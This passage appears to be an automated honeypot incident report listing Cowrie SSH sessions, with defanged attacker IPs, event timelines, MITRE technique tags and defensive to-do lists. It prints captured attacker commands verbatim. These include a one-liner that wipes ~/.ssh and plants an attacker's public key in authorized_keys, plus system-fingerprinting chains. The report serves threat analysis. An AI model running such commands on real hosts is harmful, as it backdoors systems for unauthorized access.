| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:33:38` | `cowrie.session.connect` |
| `2026-07-22 05:33:38` | `cowrie.client.version` |
| `2026-07-22 05:33:38` | `cowrie.client.kex` |
| `2026-07-22 05:33:38` | `cowrie.login.success` |
| `2026-07-22 05:33:39` | `cowrie.session.params` |
| `2026-07-22 05:33:39` | `cowrie.command.input` |
| `2026-07-22 05:33:39` | `cowrie.command.failed` |
| `2026-07-22 05:33:39` | `cowrie.log.closed` |
| `2026-07-22 05:33:40` | `cowrie.session.params` |
| `2026-07-22 05:33:40` | `cowrie.command.input` |
| `2026-07-22 05:33:40` | `cowrie.session.file_download` |
| `2026-07-22 05:33:40` | `cowrie.log.closed` |
| `2026-07-22 05:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.178.142[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.178.142[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f34763fbde

| Field | Detail |
|---|---|
| **Source IP** | `51.178.142[.]35` |
| **First Seen** | 2026-07-22 05:33 |
| **Last Seen** | 2026-07-22 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:33:40` | `cowrie.session.connect` |
| `2026-07-22 05:33:40` | `cowrie.client.version` |
| `2026-07-22 05:33:40` | `cowrie.client.kex` |
| `2026-07-22 05:33:40` | `cowrie.login.success` |
| `2026-07-22 05:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.178.142[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.178.142[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85d4f5ec0ae

| Field | Detail |
|---|---|
| **Source IP** | `51.178.142[.]35` |
| **First Seen** | 2026-07-22 05:33 |
| **Last Seen** | 2026-07-22 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:33:41` | `cowrie.session.connect` |
| `2026-07-22 05:33:41` | `cowrie.client.version` |
| `2026-07-22 05:33:41` | `cowrie.client.kex` |
| `2026-07-22 05:33:41` | `cowrie.login.success` |
| `2026-07-22 05:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.178.142[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.178.142[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eacb65e605dd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 05:33 |
| **Last Seen** | 2026-07-22 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:33:50` | `cowrie.session.connect` |
| `2026-07-22 05:33:50` | `cowrie.client.version` |
| `2026-07-22 05:33:50` | `cowrie.client.kex` |
| `2026-07-22 05:33:50` | `cowrie.login.success` |
| `2026-07-22 05:33:51` | `cowrie.session.params` |
| `2026-07-22 05:33:51` | `cowrie.command.input` |
| `2026-07-22 05:33:51` | `cowrie.log.closed` |
| `2026-07-22 05:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fec08597626

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:33 |
| **Last Seen** | 2026-07-22 05:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:33:52` | `cowrie.session.connect` |
| `2026-07-22 05:33:52` | `cowrie.client.version` |
| `2026-07-22 05:33:52` | `cowrie.client.kex` |
| `2026-07-22 05:33:53` | `cowrie.login.success` |
| `2026-07-22 05:33:55` | `cowrie.session.params` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.success` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.command.input` |
| `2026-07-22 05:33:55` | `cowrie.log.closed` |
| `2026-07-22 05:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137d7334cab2

| Field | Detail |
|---|---|
| **Source IP** | `191.36.152[.]28` |
| **First Seen** | 2026-07-22 05:35 |
| **Last Seen** | 2026-07-22 05:40 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:35:23` | `cowrie.session.connect` |
| `2026-07-22 05:35:23` | `cowrie.client.version` |
| `2026-07-22 05:35:23` | `cowrie.client.kex` |
| `2026-07-22 05:35:24` | `cowrie.login.success` |
| `2026-07-22 05:35:25` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.36.152[.]28` to AbuseIPDB if not already reported
- [ ] Block `191.36.152[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4626bdd572c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:35 |
| **Last Seen** | 2026-07-22 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:35:26` | `cowrie.session.connect` |
| `2026-07-22 05:35:26` | `cowrie.client.version` |
| `2026-07-22 05:35:26` | `cowrie.client.kex` |
| `2026-07-22 05:35:26` | `cowrie.login.success` |
| `2026-07-22 05:35:27` | `cowrie.session.params` |
| `2026-07-22 05:35:27` | `cowrie.command.input` |
| `2026-07-22 05:35:27` | `cowrie.log.closed` |
| `2026-07-22 05:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfcd57e70b01

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-22 05:35 |
| **Last Seen** | 2026-07-22 05:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:35:30` | `cowrie.session.connect` |
| `2026-07-22 05:35:30` | `cowrie.client.version` |
| `2026-07-22 05:35:30` | `cowrie.client.kex` |
| `2026-07-22 05:35:32` | `cowrie.login.success` |
| `2026-07-22 05:35:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de2609f685f

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-07-22 05:35 |
| **Last Seen** | 2026-07-22 05:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:35:31` | `cowrie.session.connect` |
| `2026-07-22 05:35:31` | `cowrie.client.version` |
| `2026-07-22 05:35:31` | `cowrie.client.kex` |
| `2026-07-22 05:35:33` | `cowrie.login.success` |
| `2026-07-22 05:35:33` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec0f600bad2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:35 |
| **Last Seen** | 2026-07-22 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:35:42` | `cowrie.session.connect` |
| `2026-07-22 05:35:42` | `cowrie.client.version` |
| `2026-07-22 05:35:42` | `cowrie.client.kex` |
| `2026-07-22 05:35:44` | `cowrie.login.success` |
| `2026-07-22 05:35:45` | `cowrie.session.params` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.success` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.command.input` |
| `2026-07-22 05:35:45` | `cowrie.log.closed` |
| `2026-07-22 05:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a4821c9ab6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 05:35 |
| **Last Seen** | 2026-07-22 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:35:55` | `cowrie.session.connect` |
| `2026-07-22 05:35:55` | `cowrie.client.version` |
| `2026-07-22 05:35:55` | `cowrie.client.kex` |
| `2026-07-22 05:35:56` | `cowrie.login.success` |
| `2026-07-22 05:35:56` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:35:56` | `cowrie.direct-tcpip.data` |
| `2026-07-22 05:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e376e7fe98fe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:37 |
| **Last Seen** | 2026-07-22 05:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:37:34` | `cowrie.session.connect` |
| `2026-07-22 05:37:34` | `cowrie.client.version` |
| `2026-07-22 05:37:34` | `cowrie.client.kex` |
| `2026-07-22 05:37:35` | `cowrie.login.success` |
| `2026-07-22 05:37:36` | `cowrie.session.params` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.success` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:36` | `cowrie.command.input` |
| `2026-07-22 05:37:37` | `cowrie.log.closed` |
| `2026-07-22 05:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df064c30f82d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:37 |
| **Last Seen** | 2026-07-22 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:37:44` | `cowrie.session.connect` |
| `2026-07-22 05:37:44` | `cowrie.client.version` |
| `2026-07-22 05:37:44` | `cowrie.client.kex` |
| `2026-07-22 05:37:44` | `cowrie.login.success` |
| `2026-07-22 05:37:45` | `cowrie.session.params` |
| `2026-07-22 05:37:45` | `cowrie.command.input` |
| `2026-07-22 05:37:45` | `cowrie.log.closed` |
| `2026-07-22 05:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc228363d05

| Field | Detail |
|---|---|
| **Source IP** | `111.70.29[.]130` |
| **First Seen** | 2026-07-22 05:38 |
| **Last Seen** | 2026-07-22 05:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:38:33` | `cowrie.session.connect` |
| `2026-07-22 05:38:33` | `cowrie.client.version` |
| `2026-07-22 05:38:33` | `cowrie.client.kex` |
| `2026-07-22 05:38:35` | `cowrie.login.success` |
| `2026-07-22 05:38:36` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.29[.]130` to AbuseIPDB if not already reported
- [ ] Block `111.70.29[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932fa172bb1b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-22 05:38 |
| **Last Seen** | 2026-07-22 05:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:38:54` | `cowrie.session.connect` |
| `2026-07-22 05:38:55` | `cowrie.client.version` |
| `2026-07-22 05:38:55` | `cowrie.client.kex` |
| `2026-07-22 05:38:57` | `cowrie.login.success` |
| `2026-07-22 05:38:57` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6980f8ab798

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-22 05:39 |
| **Last Seen** | 2026-07-22 05:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:39:03` | `cowrie.session.connect` |
| `2026-07-22 05:39:03` | `cowrie.client.version` |
| `2026-07-22 05:39:03` | `cowrie.client.kex` |
| `2026-07-22 05:39:06` | `cowrie.login.success` |
| `2026-07-22 05:39:06` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2d35090cc6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:39 |
| **Last Seen** | 2026-07-22 05:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:39:29` | `cowrie.session.connect` |
| `2026-07-22 05:39:29` | `cowrie.client.version` |
| `2026-07-22 05:39:29` | `cowrie.client.kex` |
| `2026-07-22 05:39:30` | `cowrie.login.success` |
| `2026-07-22 05:39:31` | `cowrie.session.params` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.success` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.command.input` |
| `2026-07-22 05:39:31` | `cowrie.log.closed` |
| `2026-07-22 05:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29baa2db9143

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:39 |
| **Last Seen** | 2026-07-22 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:39:53` | `cowrie.session.connect` |
| `2026-07-22 05:39:53` | `cowrie.client.version` |
| `2026-07-22 05:39:53` | `cowrie.client.kex` |
| `2026-07-22 05:39:54` | `cowrie.login.success` |
| `2026-07-22 05:39:54` | `cowrie.session.params` |
| `2026-07-22 05:39:54` | `cowrie.command.input` |
| `2026-07-22 05:39:54` | `cowrie.log.closed` |
| `2026-07-22 05:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069325e7e7c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:41 |
| **Last Seen** | 2026-07-22 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:41:27` | `cowrie.session.connect` |
| `2026-07-22 05:41:27` | `cowrie.client.version` |
| `2026-07-22 05:41:27` | `cowrie.client.kex` |
| `2026-07-22 05:41:28` | `cowrie.login.success` |
| `2026-07-22 05:41:29` | `cowrie.session.params` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.success` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:29` | `cowrie.command.input` |
| `2026-07-22 05:41:30` | `cowrie.log.closed` |
| `2026-07-22 05:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-926961e8b681

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 05:41 |
| **Last Seen** | 2026-07-22 05:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:41:27` | `cowrie.session.connect` |
